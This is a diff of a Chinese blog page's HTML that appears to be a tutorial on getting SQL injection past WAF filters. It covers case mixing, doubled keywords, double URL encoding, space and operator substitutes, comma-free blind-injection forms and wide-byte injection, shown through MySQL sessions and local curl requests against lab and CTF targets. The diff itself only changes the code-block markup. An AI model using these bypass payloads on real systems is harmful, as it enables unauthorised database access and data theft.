@@ -87,13 +87,13 @@ information_schemainnodb_tables_stats
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    35k
+                    12k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    32 mins.
+                    11 mins.
                 </span>
                 
                 
@@ -132,65 +132,342 @@ information_schemainnodb_tables_stats
 <h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p><code>innodb_tables_stats</code></p>
 <h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>对于大小写敏感的 WAF ，可以用大小写绕过</p>
 <p>全大写、大小写混写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 Union Select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~<span class="comment"># cat SX.php </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$id1</span> = <span class="string">"infoorrmation"</span>;</span><br><span class="line"><span class="variable">$id2</span> = <span class="string">"ununionion"</span>;</span><br><span class="line"><span class="variable">$id3</span> = <span class="string">"selselectect"</span>;</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">"/or/i"</span>,<span class="string">""</span>,<span class="variable">$id1</span>).<span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">"/union/i"</span>,<span class="string">""</span>,<span class="variable">$id2</span>).<span class="string">" "</span>.preg_replace(<span class="string">"/select/i"</span>,<span class="string">""</span>,<span class="variable">$id3</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">root@Knlvre:~<span class="comment"># php SX.php </span></span><br><span class="line">information</span><br><span class="line">union select</span><br></pre></td></tr></table></figure>
+<pre><code>mysql&gt; select 1,2,3 union select * from users;
++----+----------+------------+
+| 1  | 2        | 3          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
++----+----------+------------+
+4 rows in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1,2,3 Union Select * from users;
++----+----------+------------+
+| 1  | 2        | 3          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
++----+----------+------------+
+4 rows in set (0.00 sec)
+</code></pre><h2 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h2><pre><code class="bash">root@Knlvre:~# cat SX.php 
+&lt;?php
+$id1 = &quot;infoorrmation&quot;;
+$id2 = &quot;ununionion&quot;;
+$id3 = &quot;selselectect&quot;;
+echo preg_replace(&quot;/or/i&quot;,&quot;&quot;,$id1).&quot;\n&quot;;
+echo preg_replace(&quot;/union/i&quot;,&quot;&quot;,$id2).&quot; &quot;.preg_replace(&quot;/select/i&quot;,&quot;&quot;,$id3);
+?&gt;
+
+root@Knlvre:~# php SX.php 
+information
+union select
+</code></pre>
 <h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p><code>%25</code>经过<code>URL编码</code>后为<code>百分号(%)</code></p>
 <p>有些题目会对传入的 GET 到的参数进行过滤，这个时候就可以结合代码中函数的问题，绕过检查</p>
 <p>① 比如攻防世界 Web 进阶题的 PHP2，我们对源码进行一些修改，如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"not allowed!"</span> . <span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"id1:"</span> . $_GET[id] . <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"id2:"</span> . $_GET[id] . <span class="string">"\n"</span>;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"id3:"</span> . $_GET[id] . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Key: xxxxxxx "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {
+  echo(&quot;not allowed!&quot; . &quot;\n&quot;);
+  echo &quot;id1:&quot; . $_GET[id] . &quot;\n&quot;;
+  exit();
+}
+echo &quot;id2:&quot; . $_GET[id] . &quot;\n&quot;;
+$_GET[id] = urldecode($_GET[id]);
+echo &quot;id3:&quot; . $_GET[id] . &quot;\n&quot;;
+if($_GET[id] == &quot;admin&quot;)
+{
+  echo &quot;Access granted!&quot;;
+  echo &quot;Key: xxxxxxx &quot;;
+}
+?&gt;
+</code></pre>
 <p>因为 php 在 GET 一个参数之前，会先自动<code>urldecode</code> 。当我们传入<code>%2561dmin</code>后，第一次自动 urldecode 结果为 <code>%61dmin</code>，第一个匹配 <code>&quot;admin&quot; === &quot;%61dmin&quot;</code>失败。第二次匹配前又 urldecode 一次，所以第二次匹配<code>&quot;admin&quot; == &quot;admin&quot;</code>成功，拿下 flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# curl 127.0.0.1/url.php?id=admin</span><br><span class="line">not allowed!</span><br><span class="line">id1:admin</span><br><span class="line"></span><br><span class="line">root@Knlvre:~# curl 127.0.0.1/url.php?id=%2561dmin</span><br><span class="line">id2:%61dmin</span><br><span class="line">id3:admin</span><br><span class="line">Access granted!Key: xxxxxxx</span><br></pre></td></tr></table></figure>
-<p>② 再比如上海CTF的 babyt5</p>
+<pre><code>root@Knlvre:~# curl 127.0.0.1/url.php?id=admin
+not allowed!
+id1:admin
+
+root@Knlvre:~# curl 127.0.0.1/url.php?id=%2561dmin
+id2:%61dmin
+id3:admin
+Access granted!Key: xxxxxxx
+</code></pre><p>② 再比如上海CTF的 babyt5</p>
 <p>用<code>php%2570</code>绕过<code>strpos</code>的检查，之后的<code>curl</code>相关函数会对URL编码再次进行解析，就可以传入正确的 payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$pos = strpos($x,<span class="string">"php"</span>);</span><br><span class="line"><span class="keyword">if</span>($pos)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$x = $_GET[&#39;x&#39;];
+$pos = strpos($x,&quot;php&quot;);
+if($pos){
+        exit(&quot;denied&quot;);
+}
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+$result = curl_exec($ch);
+echo $result;
+?&gt;
+</code></pre>
 <h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p><code>%20、+、()、%0a、%09、%a0、%0b、%0c、%0d、/**/</code>等 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from/**/users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h2><p><code>like、regexp、liker、&lt;&gt;、!</code>等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=0;</span><br><span class="line">+-----+</span><br><span class="line">| 1=0 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 like 0;</span><br><span class="line">+----------+</span><br><span class="line">| 1 like 0 |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.13 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 regexp 1;</span><br><span class="line">+------------+</span><br><span class="line">| 1 regexp 1 |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.06 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 &lt;&gt; 1;</span><br><span class="line">+--------+</span><br><span class="line">| 1 &lt;&gt; 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p><code>&amp;&amp;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 and 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 and 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 &amp;&amp; 1;</span><br><span class="line">+--------+</span><br><span class="line">| 1 &amp;&amp; 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><p><code>||、xor、&amp;、^（or与and在特殊情况下可以相互代替）</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 or 1;</span><br><span class="line">+--------+</span><br><span class="line">| 1 or 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 &amp; 1;</span><br><span class="line">+-------+</span><br><span class="line">| 1 &amp; 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h2><p>盲注：可以用<code>from 1</code>、<code>from 1 for 1</code>或者<code>2 offset 1</code></p>
+<pre><code>mysql&gt; select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
++----+----------+------------+
+3 rows in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select * from/**/users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
++----+----------+------------+
+3 rows in set (0.00 sec)
+</code></pre><h2 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h2><p><code>like、regexp、liker、&lt;&gt;、!</code>等</p>
+<pre><code>mysql&gt; select 1=0;
++-----+
+| 1=0 |
++-----+
+|   0 |
++-----+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1 like 0;
++----------+
+| 1 like 0 |
++----------+
+|        0 |
++----------+
+1 row in set (0.13 sec)
+</code></pre><pre><code>mysql&gt; select 1 regexp 1;
++------------+
+| 1 regexp 1 |
++------------+
+|          1 |
++------------+
+1 row in set (0.06 sec)
+</code></pre><pre><code>mysql&gt; select 1 &lt;&gt; 1;
++--------+
+| 1 &lt;&gt; 1 |
++--------+
+|      0 |
++--------+
+1 row in set (0.00 sec)
+</code></pre><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p><code>&amp;&amp;</code></p>
+<pre><code>mysql&gt; select 1 and 0;
++---------+
+| 1 and 0 |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1 &amp;&amp; 1;
++--------+
+| 1 &amp;&amp; 1 |
++--------+
+|      1 |
++--------+
+1 row in set (0.00 sec)
+</code></pre><h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><p><code>||、xor、&amp;、^（or与and在特殊情况下可以相互代替）</code></p>
+<pre><code>mysql&gt; select 1 or 1;
++--------+
+| 1 or 1 |
++--------+
+|      1 |
++--------+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1 xor 0;
++---------+
+| 1 xor 0 |
++---------+
+|       1 |
++---------+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1 &amp; 1;
++-------+
+| 1 &amp; 1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select 1 ^ 0;
++-------+
+| 1 ^ 0 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+</code></pre><h2 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h2><p>盲注：可以用<code>from 1</code>、<code>from 1 for 1</code>或者<code>2 offset 1</code></p>
 <p>联合查询：可以用<code>join</code></p>
 <p>substring</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| security   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(database(),2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substring(database(),2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| ecurity                 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(database() from 3);</span><br><span class="line">+------------------------------+</span><br><span class="line">| substring(database() from 3) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| curity                       |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>substr</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(database(),1,1);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(database(),1,1) |</span><br><span class="line">+------------------------+</span><br><span class="line">| s                      |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database() from 2 for 1);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| substr(database() from 2 for 1) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| e                               |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database() from 1 for 2);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| substr(database() from 1 for 2) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| se                              |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>limit（注意 offset 中变量的位置颠倒）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users limit 1 offset 0;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users limit 2 offset 0;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>union select</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=0 union select 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=0 union select * from (select 1)a join (sel</span><br><span class="line">ect 2)b join (select 3)c;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.06 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h2><p>单引号的逃逸利用的知识点是<code>宽字节注入</code>，当我们传入的单引号被处理时（无论是GPC开启、addslashes()或者自定义函数），而此时如果编码是<code>GBK</code>，就可以利用宽字节注入</p>
+<pre><code>mysql&gt; select database();
++------------+
+| database() |
++------------+
+| security   |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select substring(database(),2);
++-------------------------+
+| substring(database(),2) |
++-------------------------+
+| ecurity                 |
++-------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select substring(database() from 3);
++------------------------------+
+| substring(database() from 3) |
++------------------------------+
+| curity                       |
++------------------------------+
+1 row in set (0.00 sec)
+</code></pre><p>substr</p>
+<pre><code>mysql&gt; select substr(database(),1,1);
++------------------------+
+| substr(database(),1,1) |
++------------------------+
+| s                      |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select substr(database() from 2 for 1);
++---------------------------------+
+| substr(database() from 2 for 1) |
++---------------------------------+
+| e                               |
++---------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select substr(database() from 1 for 2);
++---------------------------------+
+| substr(database() from 1 for 2) |
++---------------------------------+
+| se                              |
++---------------------------------+
+1 row in set (0.00 sec)
+</code></pre><p>limit（注意 offset 中变量的位置颠倒）</p>
+<pre><code>mysql&gt; select * from users limit 0,1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users limit 1 offset 0;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users limit 2 offset 0;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
++----+----------+------------+
+2 rows in set (0.00 sec)
+</code></pre><p>union select</p>
+<pre><code>mysql&gt; select * from users where id=0 union select 1,2,3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select * from users where id=0 union select * from (select 1)a join (sel
+ect 2)b join (select 3)c;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+1 row in set (0.06 sec)
+</code></pre><h2 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h2><p>单引号的逃逸利用的知识点是<code>宽字节注入</code>，当我们传入的单引号被处理时（无论是GPC开启、addslashes()或者自定义函数），而此时如果编码是<code>GBK</code>，就可以利用宽字节注入</p>
